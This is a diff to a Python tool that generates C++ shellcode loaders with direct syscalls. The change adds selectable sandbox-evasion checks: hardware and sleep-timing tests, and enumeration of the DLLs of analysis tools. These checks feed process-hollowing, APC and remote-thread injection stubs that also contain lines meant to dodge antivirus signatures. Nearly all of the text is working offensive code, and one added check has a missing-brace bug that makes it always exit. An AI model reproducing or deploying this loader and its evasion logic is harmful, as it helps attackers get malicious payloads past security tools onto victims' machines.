@@ -36,89 +36,7 @@ unsigned char* decoded = (unsigned char*)malloc(payload_len);
 #define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
 #define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000
 
-int PrintModules(DWORD processID)
-{
-    HMODULE hMods[1024];
-    HANDLE hProcess;
-    DWORD cbNeeded;
-    unsigned int i;
-    OBJECT_ATTRIBUTES oa;
-    CLIENT_ID cid;
-
-    cid.UniqueProcess = processID;
-
-    // Print the process identifier.
-    //printf("\\nProcess ID: %u\\n", processID);
-
-    // Get a handle to the process.
-    NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
-    if (NULL == hProcess)
-        return 1;
-
-    // Get a list of all the modules in this process.
-    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
-    {
-        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
-        {
-            TCHAR szModName[MAX_PATH];
-
-            // Get the full path to the module's file.
-            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
-                sizeof(szModName) / sizeof(TCHAR)))
-            {
-                //std::string target = L"Dbghelp.dll";
-                String dang = szModName;
-
-                //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
-                if (dang.find(L"SbieDll.dll") != std::string::npos || dang.find(L"Api_log.dll") != std::string::npos || dang.find(L"Dir_watch.dll") != std::string::npos || dang.find(L"dbghelp.dll") != std::string::npos)
-                {
-                    // Print the module name and handle value.
-                    //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
-                    return 2;
-                }
-                
-            }
-        }
-    }
-
-    // Release the handle to the process.
-    NtClose(hProcess);
-    return 0;
-}
-
-int getLoadedDlls()
-{
-    DWORD aProcesses[1024];
-    DWORD cbNeeded;
-    DWORD cProcesses;
-    unsigned int i;
-
-    // Get the list of process identifiers.
-    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
-        return 1;
-
-    // Calculate how many process identifiers were returned.
-    cProcesses = cbNeeded / sizeof(DWORD);
-
-    // Print the names of the modules for each process.
-    int result;
-    int done = 0;
-    DWORD saved;
-    //Loop for dlls. Loop will continue until dlls are found to bypass sandboxing.
-    while (done != 2)
-    {
-        for (i = 0; i < cProcesses; i++)
-        {
-            result = PrintModules(aProcesses[i]);
-            if (result == 2)
-            {
-                done = result;
-                saved = aProcesses[i];
-            }
-        }
-    }
-    return 0;
-}
+REPLACE_SANDBOX_CHECK
 
 REPLACE_PROCESS_FUNCTIONS
 
@@ -142,6 +60,109 @@ int main()
 {
     REPLACE_STUB_METHOD
 }"""
+
+sandbox_check = """
+//thanks @Cerbersec!
+BOOL CheckSandbox() {
+    SYSTEM_INFO systemInfo;
+    GetSystemInfo(&systemInfo);
+    if (systemInfo.dwNumberOfProcessors < 2)
+        return TRUE;
+
+    MEMORYSTATUSEX memoryStatus;
+    memoryStatus.dwLength = sizeof(memoryStatus);
+    GlobalMemoryStatusEx(&memoryStatus);
+    if (memoryStatus.ullTotalPhys / 1024 / 1024 < 2048)
+        return TRUE;
+
+    ULONG64 timeBeforeSleep = GetTickCount64();
+    LARGE_INTEGER delay;
+    delay.QuadPart = -10000 * 60000;
+    std::cout << "Please wait 60 seconds..." << std::endl;
+    NtDelayExecution(FALSE, &delay);
+    ULONG64 timeAfterSleep = GetTickCount64();
+    if (timeAfterSleep - timeBeforeSleep < 60000)
+        return TRUE;
+
+    return FALSE;
+}
+"""
+
+dll_sandbox_check = """
+int PrintModules(DWORD processID)
+{
+    HMODULE hMods[1024];
+    HANDLE hProcess;
+    DWORD cbNeeded;
+    unsigned int i;
+    OBJECT_ATTRIBUTES oa;
+    CLIENT_ID cid;
+    cid.UniqueProcess = processID;
+    // Print the process identifier.
+    //printf("\\nProcess ID: %u\\n", processID);
+    // Get a handle to the process.
+    NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
+    if (NULL == hProcess)
+        return 1;
+    // Get a list of all the modules in this process.
+    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
+    {
+        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
+        {
+            TCHAR szModName[MAX_PATH];
+            // Get the full path to the module's file.
+            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
+                sizeof(szModName) / sizeof(TCHAR)))
+            {
+                //std::string target = L"Dbghelp.dll";
+                String dang = szModName;
+                //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
+                if (dang.find(L"SbieDll.dll") != std::string::npos || dang.find(L"Api_log.dll") != std::string::npos || dang.find(L"Dir_watch.dll") != std::string::npos || dang.find(L"dbghelp.dll") != std::string::npos)
+                {
+                    // Print the module name and handle value.
+                    //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
+                    return 2;
+                }
+                
+            }
+        }
+    }
+    // Release the handle to the process.
+    NtClose(hProcess);
+    return 0;
+}
+
+int getLoadedDlls()
+{
+    DWORD aProcesses[1024];
+    DWORD cbNeeded;
+    DWORD cProcesses;
+    unsigned int i;
+    // Get the list of process identifiers.
+    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
+        return 1;
+    // Calculate how many process identifiers were returned.
+    cProcesses = cbNeeded / sizeof(DWORD);
+    // Print the names of the modules for each process.
+    int result;
+    int done = 0;
+    DWORD saved;
+    //Loop for dlls. Loop will continue until dlls are found to bypass sandboxing.
+    while (done != 2)
+    {
+        for (i = 0; i < cProcesses; i++)
+        {
+            result = PrintModules(aProcesses[i]);
+            if (result == 2)
+            {
+                done = result;
+                saved = aProcesses[i];
+            }
+        }
+    }
+    return 0;
+}
+"""
 
 process_functions = """
 HANDLE GetParentHandle(LPCSTR parent)
@@ -209,7 +230,7 @@ PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
 """
 
 process_hollow_stub = """
-    getLoadedDlls();
+    REPLACE_ME_SANDBOX_CALL
     deC(payload);
 
     //next few lines do nothing... but they help evade some AV signatures
@@ -341,7 +362,7 @@ CurrentThread_stub = """
     HANDLE thandle = NULL;
     SIZE_T bytesWritten;
 
-    getLoadedDlls();
+    REPLACE_ME_SANDBOX_CALL
     deC(payload);
 
     NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -412,7 +433,7 @@ QueueUserAPC_stub = """
     PVOID base_addr = NULL;
     SIZE_T bytesWritten;
 
-    getLoadedDlls();
+    REPLACE_ME_SANDBOX_CALL
     deC(payload);
 
     //next few lines do nothing... but they help evade some AV signatures
@@ -493,7 +514,7 @@ RemoteThreadSuspended_stub = """
     HANDLE hProcess = NULL;
     SIZE_T bytesWritten;
 
-    getLoadedDlls();
+    REPLACE_ME_SANDBOX_CALL
     deC(payload);
 
     PROCESSENTRY32 entry;
@@ -599,7 +620,7 @@ RemoteThreadContext_stub = """
     PVOID base_addr = NULL;
     SIZE_T bytesWritten;
 
-    getLoadedDlls();
+    REPLACE_ME_SANDBOX_CALL
     deC(payload);
 
     //next few lines do nothing... but they help evade some AV signatures
@@ -706,6 +727,14 @@ RemoteThreadContext_stub = """
     NtClose(hThread);
 """
 
+invoke_sandbox_check = """
+    if (CheckSandbox())
+        std::cout << "Sandbox checks failed; exiting." << std::endl;
+        return 0;
+
+    std::cout << "Sandbox checks passed" << std::endl;
+"""
+
 def generateKey(length):
     letters = string.ascii_letters + string.digits
     key = ''.join(random.choice(letters) for i in range(length))
@@ -716,7 +745,7 @@ def generateRandomSyscall(length):
     syscall = ''.join(random.choice(letters) for i in range(length))
     return syscall
 
-def main(stub, infile, outfile, key, process, method, no_randomize, verbose):
+def main(stub, infile, outfile, key, process, method, no_randomize, verbose, dll_sandbox):
     print("[+] ICYGUIDER'S CUSTOM SYSWHISPERS SHELLCODE LOADER")
     method = method.lower()
     file_size = os.path.getsize(infile)
@@ -788,6 +817,14 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose):
         stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
         stub = stub.replace("REPLACE_STUB_METHOD", CurrentThread_stub)
 
+    if dll_sandbox == True:
+        print("[+] Using DLL enumeration for sandbox evasion")
+        stub = stub.replace("REPLACE_SANDBOX_CHECK", dll_sandbox_check)
+        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "getLoadedDlls();")
+    else:
+        stub = stub.replace("REPLACE_SANDBOX_CHECK", sandbox_check)
+        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", invoke_sandbox_check)
+
     #Randomize Syscall names
     f = open("Syscalls.h", "r")
     syscall_contents = f.read()
@@ -795,7 +832,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose):
     if no_randomize != True:
         print("[+] Randomizing syscall names")
         name_len = 19
-        syscalls = ["NtQueryInformationProcess", "NtReadVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtResumeThread", "NtClose", "NtOpenProcess", "NtCreateThreadEx", "NtAllocateVirtualMemory", "NtWaitForSingleObject", "NtQueueApcThread", "NtAlertResumeThread", "NtGetContextThread", "NtSetContextThread"]
+        syscalls = ["NtQueryInformationProcess", "NtReadVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtResumeThread", "NtClose", "NtOpenProcess", "NtCreateThreadEx", "NtAllocateVirtualMemory", "NtWaitForSingleObject", "NtQueueApcThread", "NtAlertResumeThread", "NtGetContextThread", "NtSetContextThread", "NtDelayExecution"]
         for syscall in syscalls:
             random_syscall = generateRandomSyscall(name_len)
             syscall_contents = syscall_contents.replace(syscall, random_syscall)
@@ -832,6 +869,7 @@ parser.add_argument('-p', '--process', dest='process', help='Process to inject i
 parser.add_argument('-m', '--method', dest='method', help='Method for shellcode execution (Options: ProcessHollow, QueueUserAPC, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (Default: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
 parser.add_argument('-nr', '--no-randomize', action='store_true', help='Disable syscall name randomization')
 parser.add_argument('-v', '--verbose', action='store_true', help='Enable debugging messages upon execution')
+parser.add_argument('-d', '--dll-sandbox', action='store_true', help='Use DLL based sandbox checks instead of the standard ones')
 parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')
 
 if len(sys.argv) < 2:
@@ -847,7 +885,7 @@ try:
         print("[+] Valid shellcode execution methods are: ProcessHollow, QueueUserAPC, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
         sys.exit()
     key = generateKey(49)
-    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose)
+    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, args.dll_sandbox)
 except:
     raise
     sys.exit()
